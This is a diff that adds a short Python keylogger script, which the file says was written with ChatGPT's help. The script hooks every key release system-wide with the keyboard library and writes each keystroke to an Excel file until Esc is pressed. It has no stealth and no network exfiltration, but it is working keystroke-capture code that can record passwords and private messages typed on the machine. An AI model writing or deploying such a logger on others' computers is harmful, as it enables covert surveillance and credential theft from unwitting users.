@@ -1,0 +1,23 @@
+import keyboard
+import pandas as pd
+
+def log_keystrokes(event):
+    # Get the pressed key
+    key = event.name
+
+    # Append the key to the DataFrame
+    df.loc[len(df)] = [key]
+
+    # Save the DataFrame to the Excel file
+    df.to_excel('keystrokes.xlsx', index=False)
+
+# Create an empty DataFrame to store the keystrokes
+df = pd.DataFrame(columns=['Keystroke'])
+
+# Start the keyboard listener
+keyboard.on_release(log_keystrokes)
+
+# Keep the script running until interrupted
+keyboard.wait('esc')
+
+# CREATED WITH THE HELP OF OPEN-AI CHAT GPT: https://chat.openai.com/chat
